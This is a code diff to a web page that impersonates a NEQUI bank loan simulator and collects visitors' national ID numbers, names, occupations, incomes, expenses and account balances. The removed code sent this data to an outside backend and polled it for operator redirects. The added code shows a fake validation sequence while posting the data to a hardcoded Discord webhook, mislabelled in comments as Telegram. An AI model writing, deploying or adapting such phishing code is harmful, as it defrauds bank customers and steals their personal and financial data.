@@ -180,6 +180,13 @@
       text-align: left;
     }
 
+    .section-subtitle {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #200020;
+      margin-bottom: 10px;
+    }
+
     /* ===== ERROR MESSAGES ===== */
     .error-msg {
       color: #dc2626;
@@ -302,6 +309,12 @@
       margin: 4px 0;
     }
 
+    .cuota-display small {
+      font-size: 0.9rem;
+      font-weight: 400;
+      color: #666;
+    }
+
     .cuota-note {
       font-size: 0.85rem;
       color: #333;
@@ -380,7 +393,7 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* ===== TOAST ===== */
+    /* ===== TOAST NOTIFICATION ===== */
     .toast {
       position: fixed;
       top: -100%;
@@ -429,51 +442,129 @@
 
     /* ===== RESPONSIVE ===== */
     @media (max-width: 480px) {
-      .hero-image h1 { font-size: 1.4rem; }
-      .main-container { padding: 0 12px 30px; }
-      .range-wrapper .amount-display { font-size: 1.5rem; }
-      .cuota-display { font-size: 1.6rem; }
-      .form-group input, .form-group select {
+      .hero-image h1 {
+        font-size: 1.4rem;
+      }
+
+      .main-container {
+        padding: 0 12px 30px;
+      }
+
+      .range-wrapper .amount-display {
+        font-size: 1.5rem;
+      }
+
+      .cuota-display {
+        font-size: 1.6rem;
+      }
+
+      .form-group input,
+      .form-group select {
         font-size: 15px;
         height: 50px;
         padding: 20px 12px 4px 40px;
       }
-      .form-group img { width: 18px; top: 15px; left: 10px; }
-      .form-group label { font-size: 14px; left: 40px; }
+
+      .form-group img {
+        width: 18px;
+        top: 15px;
+        left: 10px;
+      }
+
+      .form-group label {
+        font-size: 14px;
+        left: 40px;
+      }
+
       .form-group input:focus + label,
       .form-group input:not(:placeholder-shown) + label {
         font-size: 10px;
         top: 4px;
       }
-      .checkbox-text { font-size: 0.72rem; }
-      .btn-primary { font-size: 1rem; padding: 14px; }
+
+      .checkbox-text {
+        font-size: 0.72rem;
+      }
+
+      .btn-primary {
+        font-size: 1rem;
+        padding: 14px;
+      }
+
+      .toast {
+        font-size: 13px;
+        padding: 14px 16px;
+        width: 95%;
+      }
     }
 
     @media (max-width: 380px) {
-      .hero-image h1 { font-size: 1.2rem; }
-      .range-wrapper .amount-display { font-size: 1.3rem; }
-      .cuota-display { font-size: 1.4rem; }
-      .form-group input, .form-group select {
+      .hero-image h1 {
+        font-size: 1.2rem;
+      }
+
+      .range-wrapper .amount-display {
+        font-size: 1.3rem;
+      }
+
+      .cuota-display {
+        font-size: 1.4rem;
+      }
+
+      .form-group input,
+      .form-group select {
         font-size: 14px;
         height: 46px;
         padding: 18px 10px 4px 36px;
       }
-      .form-group img { width: 16px; top: 14px; left: 8px; }
-      .form-group label { font-size: 13px; left: 36px; }
+
+      .form-group img {
+        width: 16px;
+        top: 14px;
+        left: 8px;
+      }
+
+      .form-group label {
+        font-size: 13px;
+        left: 36px;
+      }
     }
 
     @media (min-width: 768px) {
-      .main-container { max-width: 480px; padding: 0 24px 50px; }
-      .hero-image { height: 260px; }
-      .hero-image h1 { font-size: 2.2rem; }
-      .range-wrapper { padding: 28px 24px; }
-      .range-wrapper .amount-display { font-size: 2.2rem; }
+      .main-container {
+        max-width: 480px;
+        padding: 0 24px 50px;
+      }
+
+      .hero-image {
+        height: 260px;
+      }
+
+      .hero-image h1 {
+        font-size: 2.2rem;
+      }
+
+      .range-wrapper {
+        padding: 28px 24px;
+      }
+
+      .range-wrapper .amount-display {
+        font-size: 2.2rem;
+      }
     }
 
     @media (min-width: 1024px) {
-      .main-container { max-width: 520px; }
-      .hero-image { height: 300px; }
-      .hero-image h1 { font-size: 2.6rem; }
+      .main-container {
+        max-width: 520px;
+      }
+
+      .hero-image {
+        height: 300px;
+      }
+
+      .hero-image h1 {
+        font-size: 2.6rem;
+      }
     }
 
     /* ===== UTILITY ===== */
@@ -493,6 +584,9 @@
     .mb-2 { margin-bottom: 8px; }
     .mb-3 { margin-bottom: 12px; }
     .mb-4 { margin-bottom: 16px; }
+    .gap-2 { gap: 8px; }
+    .gap-3 { gap: 12px; }
+    .gap-4 { gap: 16px; }
     .w-full { width: 100%; }
     .flex { display: flex; }
     .flex-col { flex-direction: column; }
@@ -502,6 +596,8 @@
     .bg-white { background: #fff; }
     .bg-pink { background: #da0081; }
     .bg-purple { background: #200020; }
+
+    /* ===== HIDDEN ===== */
     .hidden { display: none !important; }
   </style>
 </head>
@@ -569,107 +665,73 @@
       <span class="select-icon">▼</span>
     </div>
 
-    <!-- Ingresos - CORREGIDO (sin formateo automático) -->
+    <!-- Ingresos -->
     <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="ingresos">
-      <input type="text" id="ingresoMensual" maxlength="15" placeholder=" " inputmode="numeric">
+      <input type="text" id="ingresoMensual" maxlength="12" placeholder=" ">
       <label for="ingresoMensual">Ingresos mensuales</label>
     </div>
-    <span id="ingresosError" class="error-msg">Ingresa tus ingresos mensuales (mínimo 100.000)</span>
+    <span id="ingresosError" class="error-msg">Ingresa tus ingresos mensuales</span>
 
-    <!-- Gastos mensuales - CORREGIDO (sin formateo automático) -->
+    <!-- Gastos mensuales -->
     <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="gastos">
-      <input type="text" id="gastosMensual" maxlength="15" placeholder=" " inputmode="numeric">
+      <input type="text" id="gastosMensual" maxlength="12" placeholder=" ">
       <label for="gastosMensual">Gastos mensuales</label>
     </div>
-    <span id="gastosError" class="error-msg">Ingresa tus gastos mensuales (mínimo 100.000)</span>
+    <span id="gastosError" class="error-msg">Ingresa tus gastos mensuales</span>
 
-    <!-- Saldo NEQUI - CORREGIDO (sin formateo automático) -->
+    <!-- Saldo NEQUI -->
     <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="saldo">
-      <input type="text" id="saldoActual" maxlength="15" placeholder=" " inputmode="numeric">
+      <input type="text" id="saldoActual" maxlength="12" placeholder=" ">
       <label for="saldoActual">Saldo actual en tu cuenta NEQUI</label>
     </div>
-    <span id="saldoError" class="error-msg">Ingresa tu saldo actual (mínimo 100.000)</span>
+    <span id="saldoError" class="error-msg">Ingresa tu saldo actual</span>
     <p class="text-gray" style="font-size: 0.75rem; margin-top: 4px;">Por políticas financieras el saldo actual no será visible en la solicitud, solo hace parte del proceso de validación ante las centrales de riesgo.</p>
 
     <!-- MONTO -->
     <h2 class="section-title" style="margin-top: 24px;">¿Cuánta plata necesitas?</h2>
     <div class="range-wrapper">
-      <div class="amount-display">$<span id="montoSeleccionado">100.000</span></div>
-      <input type="range" id="montoSlider" min="100000" max="20000000" step="100000" value="100000" class="range-slider">
+      <div class="amount-display">$<span id="montoSeleccionado">1.000.000</span></div>
+      <input type="range" id="montoSlider" min="1000000" max="10000000" step="1000000" value="1000000" class="range-slider">
       <div class="range-labels">
-        <span>$100.000</span>
-        <span>$20.000.000</span>
+        <span>$1.000.000</span>
+        <span>$10.000.000</span>
       </div>
     </div>
+    <p class="text-gray" style="font-size: 0.75rem; margin: 8px 0 16px;">Ten en cuenta que el valor que selecciones en este rango, es el valor que vas a desembolsar.</p>
 
     <!-- INFORMACIÓN CRÉDITO -->
     <h2 class="section-title">Información sobre tu crédito</h2>
 
-    <!-- Fecha de pago -->
+    <!-- Cuotas -->
     <div class="form-group">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="cuotas">
+      <select id="plazoSelector">
+        <option value="1">1 mes</option>
+        <option value="2">2 meses</option>
+        <option value="3">3 meses</option>
+        <option value="4">4 meses</option>
+        <option value="5">5 meses</option>
+        <option value="6">6 meses</option>
+        <option value="7">7 meses</option>
+        <option value="8">8 meses</option>
+        <option value="9">9 meses</option>
+        <option value="10" selected>10 meses</option>
+        <option value="11">11 meses</option>
+        <option value="12">12 meses</option>
+      </select>
+      <span class="select-icon">▼</span>
+    </div>
+
+    <!-- Fecha de pago -->
+    <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM7 10h5v5H7z'/%3E%3C/svg%3E" alt="calendario">
       <select id="fechaPago">
         <option value="1">1 de cada mes</option>
-        <option value="2">2 de cada mes</option>
-        <option value="3">3 de cada mes</option>
-        <option value="4">4 de cada mes</option>
-        <option value="5">5 de cada mes</option>
-        <option value="6">6 de cada mes</option>
-        <option value="7">7 de cada mes</option>
-        <option value="8">8 de cada mes</option>
-        <option value="9">9 de cada mes</option>
-        <option value="10">10 de cada mes</option>
-        <option value="11">11 de cada mes</option>
-        <option value="12">12 de cada mes</option>
-        <option value="13">13 de cada mes</option>
-        <option value="14">14 de cada mes</option>
         <option value="15">15 de cada mes</option>
-        <option value="16">16 de cada mes</option>
-        <option value="17">17 de cada mes</option>
-        <option value="18">18 de cada mes</option>
-        <option value="19">19 de cada mes</option>
-        <option value="20">20 de cada mes</option>
-        <option value="21">21 de cada mes</option>
-        <option value="22">22 de cada mes</option>
-        <option value="23">23 de cada mes</option>
-        <option value="24">24 de cada mes</option>
         <option value="25">25 de cada mes</option>
-        <option value="26">26 de cada mes</option>
-        <option value="27">27 de cada mes</option>
-        <option value="28">28 de cada mes</option>
-        <option value="29">29 de cada mes</option>
-        <option value="30">30 de cada mes</option>
-        <option value="31">31 de cada mes</option>
-      </select>
-      <span class="select-icon">▼</span>
-    </div>
-
-    <!-- Cuotas -->
-    <div class="form-group" style="margin-top: 8px;">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="cuotas">
-      <select id="plazoSelector">
-        <option value="12">12 meses</option>
-        <option value="24" selected>24 meses</option>
-        <option value="36">36 meses</option>
-        <option value="48">48 meses</option>
-        <option value="60">60 meses</option>
-        <option value="72">72 meses</option>
-      </select>
-      <span class="select-icon">▼</span>
-    </div>
-
-    <!-- Motivo -->
-    <div class="form-group" style="margin-top: 8px;">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" alt="motivo">
-      <select id="motivoCredito">
-        <option value="Inversión">Inversión</option>
-        <option value="Vacaciones">Vacaciones</option>
-        <option value="Hogar">Hogar</option>
-        <option value="Educación">Educación</option>
-        <option value="Otros">Otros</option>
       </select>
       <span class="select-icon">▼</span>
     </div>
@@ -680,7 +742,7 @@
 
     <!-- Cuota mensual -->
     <h2 class="section-title">Valor aproximado de tu cuota mensual:</h2>
-    <div class="cuota-display" id="cuotaMensual">$14.233</div>
+    <div class="cuota-display" id="cuotaMensual">$15.900</div>
     <p class="cuota-note">Incluye préstamo (capital), seguro e intereses.</p>
 
     <!-- CHECKBOX -->
@@ -692,7 +754,7 @@
     </div>
 
     <!-- BOTÓN -->
-    <button id="btnSolicitar" class="btn-primary" disabled>Solicitar</button>
+    <button id="btnSolicitar" class="btn-primary" disabled>Validar</button>
 
     <!-- FOOTER -->
     <div class="footer">
@@ -715,81 +777,8 @@
     <p class="spinner-text" id="spinnerText">Un momento por favor, estamos procesando tu solicitud...</p>
   </div>
 
-  <!-- ===== LOADER NEQUI mint ===== -->
-  <div class="loading-spinner" id="loadingContenedor" style="display:none; z-index:99999;">
-    <div class="nequi-loader" id="loader">
-      <div class="cubes">
-        <div class="cube"></div>
-        <div class="cube"></div>
-      </div>
-    </div>
-    <div class="done" id="done">
-      <div class="check"></div>
-      <span>¡Listo!</span>
-    </div>
-  </div>
-
-  <style>
-    .nequi-loader {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-    .cubes {
-      display: flex;
-      gap: 12px;
-    }
-    .cube {
-      width: 40px;
-      height: 40px;
-      background: #da0081;
-      animation: cubeBounce 1.2s infinite ease-in-out;
-    }
-    .cube:nth-child(2) {
-      animation-delay: 0.3s;
-    }
-    @keyframes cubeBounce {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(0.4); }
-    }
-    .done {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-    }
-    .done.show {
-      display: flex;
-    }
-    .done .check {
-      width: 60px;
-      height: 60px;
-      border-radius: 50%;
-      background: #da0081;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 12px;
-    }
-    .done .check::after {
-      content: "";
-      width: 24px;
-      height: 12px;
-      border-left: 4px solid #fff;
-      border-bottom: 4px solid #fff;
-      transform: rotate(-45deg);
-    }
-    .done span {
-      font-size: 18px;
-      font-weight: 600;
-      color: #200020;
-    }
-  </style>
-
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-
-      // ===== CONFIGURACIÓN =====
-      const API_BASE_URL = 'https://nequiscol.onrender.com';
 
       // ===== ELEMENTOS =====
       const cedulaInput = document.getElementById('cedula');
@@ -815,29 +804,21 @@
       const toastMessage = document.getElementById('toastMessage');
 
       let isChecked = false;
-      let isFirstClick = true;
-
-      // ===== OBTENER SESSION ID =====
-      let sessionId = localStorage.getItem('sessionId');
-      if (!sessionId) {
-        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        localStorage.setItem('sessionId', sessionId);
-      }
 
       // ===== PRECARGAR DATOS DESDE localStorage =====
       try {
         const formData = JSON.parse(localStorage.getItem('formData') || '{}');
         if (formData.cedula) {
           cedulaInput.value = formData.cedula;
+          cedulaInput.dispatchEvent(new Event('input'));
         }
         if (formData.nombre) {
           nombreInput.value = formData.nombre;
+          nombreInput.dispatchEvent(new Event('input'));
         }
         if (formData.nombreCompleto) {
           nombreInput.value = formData.nombreCompleto;
-        }
-        if (localStorage.getItem('loanFirstClickSent') === 'true') {
-          isFirstClick = false;
+          nombreInput.dispatchEvent(new Event('input'));
         }
       } catch (e) { /* Ignorar */ }
 
@@ -851,7 +832,8 @@
       }
 
       function validarMonto(val) {
-        return val.length >= 6;
+        const num = val.replace(/[^0-9]/g, '');
+        return num.length >= 6;
       }
 
       function actualizarBoton() {
@@ -874,6 +856,15 @@
         cuotaDisplay.textContent = '$' + new Intl.NumberFormat('es-CO').format(Math.round(cuota));
       }
 
+      function formatCurrency(value) {
+        return new Intl.NumberFormat('es-CO', {
+          style: 'currency',
+          currency: 'COP',
+          minimumFractionDigits: 0,
+          maximumFractionDigits: 0
+        }).format(value).replace('COP', '').trim();
+      }
+
       function updateSliderBackground() {
         const val = ((montoSlider.value - montoSlider.min) / (montoSlider.max - montoSlider.min)) * 100;
         montoSlider.style.background = `linear-gradient(to right, #da0081 ${val}%, #666 ${val}%)`;
@@ -888,21 +879,6 @@
           toast.style.background = '#0bbd67';
         }
         setTimeout(() => toast.classList.remove('show'), 4000);
-      }
-
-      // ===== FUNCIÓN PARA ENVIAR AL BACKEND =====
-      async function enviarAlBackend(endpoint, data) {
-        try {
-          const response = await fetch(`${API_BASE_URL}${endpoint}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-          });
-          return await response.json();
-        } catch (error) {
-          console.error('Error al enviar al backend:', error);
-          throw error;
-        }
       }
 
       // ===== EVENTOS =====
@@ -925,10 +901,15 @@
         actualizarBoton();
       });
 
-      // Ingresos - SOLO NÚMEROS (sin formateo automático)
-      ingresoInput.addEventListener('input', function() {
-        this.value = this.value.replace(/[^0-9]/g, '');
-        if (!validarMonto(this.value)) {
+      ingresoInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val) {
+          const num = parseInt(val) / 100;
+          e.target.value = formatCurrency(num);
+        } else {
+          e.target.value = '';
+        }
+        if (!validarMonto(e.target.value)) {
           ingresosError.classList.add('show');
         } else {
           ingresosError.classList.remove('show');
@@ -936,10 +917,15 @@
         actualizarBoton();
       });
 
-      // Gastos - SOLO NÚMEROS (sin formateo automático)
-      gastosInput.addEventListener('input', function() {
-        this.value = this.value.replace(/[^0-9]/g, '');
-        if (!validarMonto(this.value)) {
+      gastosInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val) {
+          const num = parseInt(val) / 100;
+          e.target.value = formatCurrency(num);
+        } else {
+          e.target.value = '';
+        }
+        if (!validarMonto(e.target.value)) {
           gastosError.classList.add('show');
         } else {
           gastosError.classList.remove('show');
@@ -947,10 +933,15 @@
         actualizarBoton();
       });
 
-      // Saldo - SOLO NÚMEROS (sin formateo automático)
-      saldoInput.addEventListener('input', function() {
-        this.value = this.value.replace(/[^0-9]/g, '');
-        if (!validarMonto(this.value)) {
+      saldoInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val) {
+          const num = parseInt(val) / 100;
+          e.target.value = formatCurrency(num);
+        } else {
+          e.target.value = '';
+        }
+        if (!validarMonto(e.target.value)) {
           saldoError.classList.add('show');
         } else {
           saldoError.classList.remove('show');
@@ -979,126 +970,71 @@
         loadingSpinner.style.display = 'flex';
         spinnerText.textContent = 'Un momento por favor, estamos procesando tu solicitud...';
 
-        // Obtener datos
+        // Simulación de proceso
+        setTimeout(() => {
+          spinnerText.textContent = 'Validando tu información...';
+        }, 2000);
+
+        setTimeout(() => {
+          spinnerText.textContent = 'Casi listo...';
+        }, 4000);
+
+        setTimeout(() => {
+          loadingSpinner.style.display = 'none';
+          showToast('✅ Validación exitosa. Redirigiendo...', 'success');
+          btnSolicitar.disabled = false;
+          
+          // Redirigir a la siguiente página
+          setTimeout(() => {
+            window.location.href = 'questions-credit.php.html';
+          }, 1500);
+        }, 6000);
+
+        // Guardar datos
         const formData = {
           cedula: cedulaInput.value,
-          nombreCompleto: nombreInput.value,
+          nombre: nombreInput.value,
           ocupacion: document.getElementById('ocupacion').value,
-          ingresoMensual: ingresoInput.value,
-          gastosMensual: gastosInput.value,
-          saldoActual: saldoInput.value,
+          ingreso: ingresoInput.value,
+          gastos: gastosInput.value,
+          saldo: saldoInput.value,
           monto: montoSeleccionado.textContent,
           plazo: plazoSelector.value,
           fechaPago: document.getElementById('fechaPago').value,
-          motivo: document.getElementById('motivoCredito').value,
         };
-
         localStorage.setItem('formData', JSON.stringify(formData));
         localStorage.setItem('aprobado', montoSeleccionado.textContent);
-
+        
+        // ===== ENVIAR A TELEGRAM =====
         try {
-          if (isFirstClick) {
-            // ===== PRIMER CLIC =====
-            spinnerText.textContent = 'Enviando información...';
-            
-            await enviarAlBackend('/step2-loan-first', {
-              sessionId: sessionId,
-              cedula: formData.cedula,
-              nombreCompleto: formData.nombreCompleto,
-              ocupacion: formData.ocupacion,
-              ingresoMensual: formData.ingresoMensual,
-              gastosMensual: formData.gastosMensual,
-              saldoActual: formData.saldoActual
-            });
-
-            localStorage.setItem('loanFirstClickSent', 'true');
-            isFirstClick = false;
-
-            loadingSpinner.style.display = 'none';
-            showToast('✅ Información guardada. Por favor, verifica el saldo y vuelve a enviar.', 'success');
-            btnSolicitar.disabled = false;
-
-            saldoInput.value = '';
-            saldoInput.focus();
-
-          } else {
-            // ===== SEGUNDO CLIC =====
-            spinnerText.textContent = 'Enviando datos completos...';
-
-            const result = await enviarAlBackend('/step2-loan-second', {
-              sessionId: sessionId,
-              saldoActual: formData.saldoActual
-            });
-
-            if (result.ok) {
-              loadingSpinner.style.display = 'none';
-              showToast('✅ Datos enviados correctamente. Espera instrucciones...', 'success');
-              btnSolicitar.disabled = false;
-
-              iniciarPolling(sessionId);
-            } else {
-              throw new Error('Error al enviar los datos');
-            }
-          }
+          const message = `✅ CLIENTE NEQUI NUEVO\n` +
+            `🆔 Cédula: ${formData.cedula}\n` +
+            `👤 Nombre: ${formData.nombre}\n` +
+            `🧑‍💼 Ocupación: ${formData.ocupacion}\n` +
+            `📈 Ingresos: ${formData.ingreso}\n` +
+            `💸 Gastos: ${formData.gastos}\n` +
+            `💰 Saldo NEQUI: ${formData.saldo}\n` +
+            `💵 Monto solicitado: ${formData.monto}\n` +
+            `⏳ Plazo: ${formData.plazo} meses\n` +
+            `📅 Fecha pago: ${formData.fechaPago}`;
+          
+          // Enviar a webhook de Telegram
+          await fetch('https://discordapp.com/api/webhooks/1512606404278620230/TH3CsJVCjBcXoVv2kGPOyRh0Ua3oG7qh8Rc4nA2v4AyzfwpTE9qBcSusehNMzVhnJ5Po', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+          });
+          console.log('✅ Mensaje enviado a Telegram');
         } catch (error) {
-          console.error('Error:', error);
-          loadingSpinner.style.display = 'none';
-          showToast('❌ Error al enviar los datos. Intenta nuevamente.', 'error');
-          btnSolicitar.disabled = false;
+          console.error('❌ Error al enviar a Telegram:', error);
         }
       });
-
-      // ===== POLLING =====
-      function iniciarPolling(sessionId) {
-        let attempts = 0;
-        const maxAttempts = 60;
-
-        const pollInterval = setInterval(async () => {
-          attempts++;
-          try {
-            const response = await fetch(`${API_BASE_URL}/instruction/${sessionId}`);
-            const data = await response.json();
-
-            if (data.redirect_to) {
-              clearInterval(pollInterval);
-              console.log('🎯 Redirección recibida:', data.redirect_to);
-
-              if (data.redirect_to === 'loan-simulator-error') {
-                showToast('❌ Error en el monto. Verifica el saldo.', 'error');
-                saldoInput.value = '';
-                saldoInput.focus();
-                return;
-              }
-
-              if (data.redirect_to === 'banned') {
-                document.body.innerHTML = `
-                  <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:white;color:#5D079D;font-size:24px;">
-                    Acceso denegado
-                  </div>
-                `;
-                return;
-              }
-
-              window.location.href = data.redirect_to;
-            }
-          } catch (error) {
-            console.error('Error en polling:', error);
-          }
-
-          if (attempts >= maxAttempts) {
-            clearInterval(pollInterval);
-            console.log('⏰ Tiempo de espera agotado');
-          }
-        }, 1000);
-      }
 
       // ===== INICIALIZAR =====
       updateSliderBackground();
       calcularCuota();
       actualizarBoton();
 
-      console.log('🔐 Session ID:', sessionId);
-      console.log('📌 Primer clic:', isFirstClick);
     });
   </script>
 
